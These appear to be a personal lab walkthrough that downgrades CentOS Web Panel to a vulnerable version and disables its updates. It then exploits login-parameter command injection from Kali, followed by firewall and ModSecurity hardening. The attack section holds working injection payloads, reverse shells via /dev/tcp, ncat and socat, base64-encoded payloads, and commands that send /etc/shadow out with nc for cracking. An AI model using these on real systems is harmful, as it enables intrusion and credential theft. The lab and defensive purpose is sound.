A. CentOS7 >> Control Web Application
-------------------------------------
1 PREPARE
- sudo yum update
- sudo yum install net-tools wget
- hostnamectl set-hostname centos.syn9.io
- reboot

2 DOWNLOAD CWP >> 0.9.8.1150
- cd /usr/local/src
- sudo wget https://centos-webpanel.com/cwp-el7-latest
- sudo chmod +x cwp-el7-latest

3 DOWNGRADE CWP >> 0.9.8.1146
- sed -i 's/0\.9\.8\.[0-9]\+/0.9.8.1146/g' cwp-el7-latest
- sed -i 's/^\(sh \/scripts\/update_cwp\)/# \1/g' cwp-el7-latest
- sudo sh cwp-el7-latest

- cd /usr/local/cwpsrv/htdocs
- wget http://static.cdn-cwp.com/files/cwp/el7/cwp-el7-0.9.8.1146.zip
- unzip -o -q cwp-el7-0.9.8.1146.zip
- rm -f cwp-el7-0.9.8.1146.zip
- sed -i '1i exit 0' /usr/local/cwpsrv/htdocs/resources/scripts/update_cwp
- sudo chattr -i -R -f ./

- cd /usr/local/cwpsrv/htdocs/resources/admin/include
- mv cron.php cron.php.bak
- mv cron_php_autoupdate.php cron_php_autoupdate.php.bak
- mv autoupdate_3rdparty.php autoupdate_3rdparty.php.bak
- cd /scripts
- mv update_cwp update_cwp.bak
- mv update_ioncube update_ioncube.bak
- mv cwp_update_all cwp_update_all.bak
- mv cwp_update_admin cwp_update_admin.bak

- service cwp-phpfpm restart
- service cwpsrv restart
- service cwpsrv-phpfpm restart
- reboot

4 IP STATIC
- sudo su
- nano /etc/sysconfig/network-scripts/ifcfg-enp0s8
	HWADDR="08:00:27:70:3D:C4"
	TYPE="Ethernet"
	BOOTPROTO="none"
	IPADDR="10.0.0.100"
	PREFIX="24"
	GATEWAY="10.0.0.1"
	DNS1="8.8.8.8"
	DEFROUTE="yes"
	IPV4_FAILURE_FATAL="no"
	IPV6INIT="no"
	NAME="enp0s8"
	UUID="2f28ee81-908d-483d-bba2-4eec54fb3797"
	DEVICE="enp0s8"
	ONBOOT="yes"
- systemctl stop NetworkManager
- systemctl disable NetworkManager
- systemctl restart network
- systemctl restart NetworkManager

B. Kali Linux >> Metasploit 6
-----------------------------
- akses > intercept > login correct username wrong pass > repeater
- tail -f /usr/local/cwpsrv/logs/access.log
- tail -f /var/log/cwp_client_login.log
- testing executable:
	- POST /login/index.php?login=$(whoami) HTTP/1.1
	- POST /login/index.php?login=$(ifconfig) HTTP/1.1	
	- POST /login/index.php?login=$(ip${IFS}a) HTTP/1.1
	- POST /login/index.php?login=$(ls${IFS}-la) HTTP/1.1	
	- POST /login/index.php?login=$(curl${IFS}192.168.1.15:8000) HTTP/1.1 // python3 -m http.server
	- POST /login/index.php?login=$(ping${IFS}192.168.1.15${IFS}-c${IFS}5) HTTP/1.1	

- standard reverse shell:
	- listener : nc -lnvp 6666
	- connect  : sh -i >& /dev/tcp/192.168.1.15/6666 0>&1
	- connect  : $(ncat${IFS}192.168.1.15${IFS}6666${IFS}-e${IFS}/bin/bash)
	- base64   : c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjE1LzY2NjYgMD4mMQo=
	- POST /login/index.php?login=$(echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjE1LzY2NjYgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash) HTTP/1.1

- encrypted reverse shell:
	- listener : socat file:`tty`,raw,echo=0 openssl-listen:6666,cert=openssl-cert/bind.pem,verify=0
	- connect  : socat exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.1.15:6666,verify=0
			   : $(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:$ip:$2,verify=0"
	- base64   : IyEvYmluL2Jhc2gKd2dldCAtcSAtTyAvdG1wL3N5bjkgaHR0cDovLzE5Mi4xNjguMS4xNS9zeW45ICYgd2FpdApzb2NhdCBleGVjOidiYXNoIC1saScscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmUgT1BFTlNTTDoxOTIuMTY4LjEuMTU6NjY2Nix2ZXJpZnk9MAo=
	- POST /login/index.php?login=$(echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjE1LzY2NjYgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash) HTTP/1.1
	
- execute base32 :  base32 -d <<< $hash | bash

- cracking /etc/shadow
	- attacker: nc -l 6666 > shadow && ncat -l 6666 > passwd
	- target  : nc 192.168.1.14 6666 < /etc/shadow && nc 192.168.1.14 6666 < /etc/passwd
	- unshadow passwd.txt shadow.txt > unshadowed.txt
	- john --fork=4 --wordlist=/usr/share/wordlists/rockyou2.txt unshadowed.txt
	- john --show unshadowed.txt


C. Post Exploitation
--------------------
- contab > open listener > send POST port to API
- curl -s --data "{\"PORT_LISTENER\":\"8888\"}" -X PATCH http://192.168.1.15:2080/

D. MITIGASI
-----------
- host-based firewall builtin
	- cat /etc/csf/csf.deny          (blacklisted IP)
	- cat /etc/csf/csf.conf          (firewall conf)
	- sudo tail -f /var/log/messages (limit 5 max tries per min, if match, block)
	- ** Feb 18 19:09:42 centos kernel: Firewall: *TCP_OUT Blocked* IN= OUT=enp0s3 SRC=192.168.1.14 DST=192.168.1.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=60473 DF PROTO=TCP SPT=38130 DPT=6666 WINDOW=29200 RES=0x00 SYN URGP=0 UID=0 GID=0
	1. LOG  tcp opt -- in * out *  0.0.0.0/0  -> 0.0.0.0/0   tcp flags:0x17/0x02 limit: avg 30/min burst 5 LOG flags 8 level 4 prefix "Firewall: *TCP_OUT Blocked
	2. LOG  udp opt -- in * out *  0.0.0.0/0  -> 0.0.0.0/0   limit: avg 30/min burst 5 LOG flags 8 level 4 prefix "Firewall: *UDP_OUT Blocked* "
	3. LOG  icmp opt -- in * out *  0.0.0.0/0  -> 0.0.0.0/0   limit: avg 30/min burst 5 LOG flags 8 level 4 prefix "Firewall: *ICMP_OUT Blocked* "

- host-based WAF ModSecurity
	- Security > ModSecurity
	- cd /usr/local/apache/modsecurity-owasp-old
	- git clone https://github.com/coreruleset/coreruleset
	- cd /usr/local/apache/modsecurity-owasp-old/coreruleset/rules/
	- mv REQUEST-922-MULTIPART-ATTACK.conf REQUEST-922-MULTIPART-ATTACK.conf.bak
	- cd /usr/local/apache/modsecurity-owasp-old
	- nano owasp.conf
		1. Include /usr/local/apache/modsecurity-owasp-old/coreruleset/rules/*.conf
	- restart service

	- tail -f /usr/local/apache/logs/modsec_audit.log


C.1 Ubuntu 20.04.5 >> Web Application Firewall
----------------------------------------------
1 PREPARE
- sudo apt update && sudo apt upgrade
- sudo apt install net-tools wget

2 INSTALASI MODSECURITY APACHE
- sudo apt install apache2
- sudo apt install libapache2-mod-security2
- sudo a2enmod security2
- sudo a2enmod headers
- sudo systemctl restart apache2

3 KONFIGURASI MODSECURITY APACHE
- sudo rm -rf /usr/share/modsecurity-crs/
- sudo git clone https://github.com/coreruleset/coreruleset.git /usr/share/modsecurity-crs/
- sudo cp /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf
- sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
- sudo nano /etc/modsecurity/modsecurity.conf
	SecRuleEngine On
- sudo nano /etc/apache2/apache2.conf /etc/apache2/sites-enabled/000-default.conf
	SecRuleEngine On
	<IfModule security2_module>
	        Include /usr/share/modsecurity-crs/crs-setup.conf
	        Include /usr/share/modsecurity-crs/rules/*.conf
	</IfModule>
- sudo mv /usr/share/modsecurity-crs/rules/REQUEST-922-MULTIPART-ATTACK.conf /usr/share/modsecurity-crs/rules/REQUEST-922-MULTIPART-ATTACK.conf.bak	
- sudo touch /var/log/apache2/modsec_audit.log
- apachectl configtest
- sudo systemctl restart apache2
- sudo tail -f /var/log/apache2/modsec_audit.log
- // test exploit param, xss, dll

4 IP STATIC
- ifconfig enp0s8
- nano /etc/netplan/00-installer-config.yaml
	network:
	  ethernets:
	    enp0s3:
	      dhcp4: true
	    enp0s8:
	      addresses:
	        - 10.0.0.250/24
	      nameservers:
	        addresses: [8.8.8.8, 8.8.4.4]
	      routes:
	        - to: default
	          via: 10.0.0.1
	  version: 2

C.2.x Ubuntu 20.04.5 >> Reverse Proxy to CWP
-------------------------------------------
- sudo a2enmod proxy proxy_http proxy_ajp rewrite deflate headers proxy_balancer proxy_connect proxy_html
- sudo a2dissite 000-default.conf
- 

C.2 Ubuntu 20.04.5 >> Reverse Proxy to CWP
-------------------------------------------
- sudo a2enmod proxy proxy_http proxy_ftp proxy_connect proxy_ajp proxy_wstunnel proxy_balancer cache headers deflate lbmethod_byrequests rewrite
- sudo nano /etc/apache2/sites-available/revproxy.conf
	<VirtualHost *:80>
        ServerName 192.168.1.16
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        ProxyRequests Off
        <Proxy *>
            Order deny,allow
            Allow from all
        </Proxy>

        ProxyPass / http://192.168.1.14:2087/login/index.php
        ProxyPassReverse / http://192.168.1.14:2087/login/index.php

        <Location />
            Order allow,deny
            Allow from all
        </Location>
	</VirtualHost>		

- sudo a2enmod proxy
- sudo a2enmod proxy_http
- sudo a2enmod proxy_balancer
- sudo a2enmod lbmethod_byrequests
- sudo a2enmod ssl
- sudo systemctl restart apache2

F. MIKROTIK & NETWORKING
-----------
1 MIKROTIK
- ip address add address=172.16.1.1/24 interface=ether1
- ip address add address=10.0.0.1/24 interface=ether2
- ip dhcp-client add interface=ether3 disabled=no
- ip address print
- ip route print